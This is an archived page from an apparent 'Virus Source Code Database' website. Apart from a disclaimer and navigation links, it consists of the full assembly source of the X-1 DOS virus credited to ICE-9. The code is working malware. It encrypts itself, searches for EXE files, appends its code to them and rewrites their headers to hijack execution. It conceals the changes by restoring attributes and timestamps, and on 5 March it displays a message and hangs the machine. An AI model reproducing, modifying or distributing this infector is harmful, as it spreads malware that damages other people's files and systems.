<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: x-1_asm</title>
<meta name="KEYWORDS" content="x-1.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for x-1.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="x_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_1_asm.php">x_1_asm</a><br>
<a href="x-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x-1_asm.php">x-1_asm</a><br>
<a href="x_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_2_asm.php">x_2_asm</a><br>
<a href="x-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x-2_asm.php">x-2_asm</a><br>
<a href="xa1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xa1__asm.php">xa1__asm</a><br>
<a href="xa1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xa1_asm.php">xa1_asm</a><br>
<a href="x__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x__asm.php">x__asm</a><br>
<a href="x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_asm.php">x_asm</a><br>
<a href="xboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xboot_asm.php">xboot_asm</a><br>
<a href="xdx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xdx_asm.php">xdx_asm</a><br>
<a href="xmas_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xmas_pas.php">xmas_pas</a><br>
<a href="xph-1029_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph-1029_asm.php">xph-1029_asm</a><br>
<a href="xph_1100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph_1100_asm.php">xph_1100_asm</a><br>
<a href="xph-1100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph-1100_asm.php">xph-1100_asm</a><br>
<a href="xxx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xxx_asm.php">xxx_asm</a><br>
<a href="xyz__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz__asm.php">xyz__asm</a><br>
<a href="xyz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz_asm.php">xyz_asm</a><br>
<a href="xyz-v2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz-v2_asm.php">xyz-v2_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

 
                        NAME NO2
                        PAGE 55,132
                        TITLE ??????


len                     equ offset key_1+4-0100h
en_len                  equ offset encry_and_save-offset main3

code segment

                        org 100h

                        ASSUME CS:CODE,DS:CODE,ES:CODE




main:                   jmp setup
main2:                  push cs
                        pop ds

                        mov ds:[data_seg],es    ; save data segments
                        mov ds:[stck_seg],ss    ; save stack segment
                        mov ds:[stck_p],sp      ; save stack pointer
                        mov ax,cs
                        add ax,10h              ; set up new stack segment
                        xor bx,bx
                        dec bx                  ; set up new stack pointer
                        mov sp,bx
                        mov ss,ax

                        call encry1             ; unencrypt rest of the virus

                        mov ax,ds:[code_seg]    ; calculate return segment
                        mov bx,es               ; save the return address
                        add bx,10h
                        add ax,bx
                        mov word ptr ds:[ret1+1],ax
                        mov ax,ds:[code_ip]
                        mov word ptr ds:[ret2+1],ax

main3:                  mov ah,2ah
                        int 21h
                        cmp dx,0305h            ; check for activation date
                        jne label_1             ; 5 March

                        mov ah,9h               ; if 5 March print message
                        mov dx,offset msg
                        int 21h
crash:                  jmp crash               ; and crash


label_1:                push cs
                        pop es
                        mov ah,1ah              ; setup new dta
                        mov dx,offset dta
                        int 21h

                        mov ah,4eh
                        mov cx,3
                        mov dx,offset filetype  ; find file *.EXE
                        int 21h
                        jnc open_file
lexit:                  jmp exit                ; if no files exit

next_file:              call close_file
                        mov ah,4fh
                        call file_int21
                        jc lexit


open_file:              mov al,byte ptr ds:[dta+15h]
                        xor ah,ah               ; save attribs
                        mov ds:[file_att],ax

                        xor cx,cx
                        call set_att            ; clear attribs

                        mov ax,3d02h 
                        mov dx,offset dta+1eh   ; open file
                        int 21h
                        jc lexit
                        mov ds:[handle],ax      ; save handle

                        mov ah,3fh
                        mov dx,offset header    ; read in header
                        mov cx,18h
                        call file_int21

                        xor cx,cx               ; move file pointer to
                        dec cx                  ; -4 from end of file
                        mov dx,-4
                        call file_int21_fp 
                        add ax,4
                        push ax                 ; push low word of length

                        mov ah,3fh
                        mov cx,4                ; read in 4 bytes
                        mov dx,offset temp1     ; which may be the marker
                        call file_int21

                        pop ax                  ; pop low word of length
                        mov di,offset temp1
                        mov si,offset key_1 
                        mov cx,4
                        repe cmpsb              ; check to see if it is our 
                        jcxz next_file          ; marker

adjust_len:
                        and ax,0fh              ; pad out file so our code
                        mov dx,10h              ; can always start at offset
                        sub dx,ax               ; 0100h
                        mov cx,0
                        call file_int21_fp

                        mov word ptr ds:[file_size],ax          ; save file len
                        mov word ptr ds:[file_size+2],dx

                        call encry_and_save     ; write our code to end of file

                        mov ax,word ptr ds:[file_size]          ; get file len
                        mov dx,word ptr ds:[file_size+2]
                        push ax                 ; store file len
                        push dx

                        mov bx,word ptr ds:[header+08h]         ; get length of 
                                                                ; header
                        mov cx,10h                              
                        div cx                                  ; sub it off
                        sub ax,bx                               ; length of file

                        mov bx,word ptr ds:[header+16h]         ; store old 
                        mov ds:[code_seg],bx                    ; start address
                        mov bx,word ptr ds:[header+14h]
                        mov ds:[code_ip],bx

                        sub ax,10h                              ; store new
                        mov word ptr ds:[header+16h],ax         ; start address
                        mov word ptr ds:[header+14h],0103h

                        pop dx                  ; get back file length
                        pop ax

                        add ax,len              ; add our length to it.
                        adc dx,0

                        push ax
                        mov cl,9                ; this bit calcs
                        shr ax,cl               ; length DIV 512
                        ror dx,cl               ; and MOD 512
                        stc

                        adc dx,ax
                        pop ax
                        and ah,1

                        mov word ptr ds:[header+02h],ax         ; write this 
                        mov word ptr ds:[header+04h],dx         ; to the header

                        mov ax,4200h            ; move file pointer to
                        xor cx,cx               ; start of file
                        cwd       
                        call file_int21

                        mov ah,40h              ; write header
                        mov cx,18h
                        mov dx,offset header
                        call file_int21

                        mov cx,word ptr ds:[dta+16h]            ; restore file 
                        mov dx,word ptr ds:[dta+18h]            ; time/date
                        mov ax,5701h
                        call file_int21

                        call close_file                         ; close file

exit:                   mov ax,ds:[stck_seg]                                
                        mov bx,ds:[stck_p]                             
                        mov ss,ax                               ; restore ss:sp
                        mov sp,bx
                        mov ax,ds:[data_seg]
                        mov ds,ax
                        mov es,ax

ret1:                   mov ax,0000h            ; get return address (cs:ip)
ret2:                   mov bx,0000h
                        push ax                 ; push them
                        push bx
                        xor ax,ax               ; clear all regs.
                        mov bx,ax
                        mov cx,ax
                        mov dx,ax
                        mov si,ax
                        mov di,ax
                        retf                    ; return to old code

close_file:             mov ah,3eh              ; close file.
                        call file_int21
                        mov cx,ds:[file_att]    ; restore old attribs
                        call set_att            


set_att:                mov ax,4301h
                        mov dx,offset dta+1eh
                        jmp file_int21

; tell 'em who wrote it. this is never displayed.

                        db '[X-1]',00h 
                        db 'ICE-9',00h  
                                                                   
; bellow is the message that the virus displays.

msg                     db '   ICE-9 Presents',0dh,0ah              
                        db ' In Association with',0dh,0ah
                        db '      The  ARcV',0dh,0ah
                        db '        [X-1]',0dh,0ah
                        db 0ah,07h,0dh
                        db 'Michelangelo activates',0dh,0ah
                        db '   -< TOMORROW >-',0dh,0ah
                        db '$' 

filetype                db '*.EXE',00h
code_seg                dw 0h
code_ip                 dw 0h

encry_and_save:         mov ah,2ch                      ; get new key
                        int 21h
                        or dx,dx
                        jz encry_and_save
                        mov byte ptr ds:[key_1-1],dh
                        call encry1                     ; encrypt virus
                        mov ah,40h
                        mov cx,len
                        mov dx,offset main              ; save virus
                        call file_int21
                        jmp encry1                      ; unencrypt

file_int21_fp:          mov ax,4202h
file_int21:             mov bx,ds:[handle]
                        int 21h
                        ret
 

encry1:                 mov si,offset main3 
                        mov cx,en_len
un1:                    xor byte ptr ds:[si],01h        ; very simple XOR 
key_1:                  inc si                          ; encryption
                        loop un1
                        ret
  
; end of the virus


setup:                  mov ax,20cdh
                        mov ds:[0100h],ax       ; this is just used to
                        mov ds:[code_seg],-10h  ; set up values for
                        mov ds:[code_ip],0100h  ; first time the virus is exec'ed
                        call encry1             ; it is NOT part of the virus.
                        jmp main2

handle                  dw 0h                   ; lots of data 
header                  db 20h dup (?)
data_seg                dw 0h
stck_seg                dw 0h
stck_p                  dw 0h
file_size               dd 0h
temp1                   db 5 dup (?)
dta                     db 6fh dup (?)
file_att                dw 0h

code ends

end main
</textarea></td></tr></table></body></html>
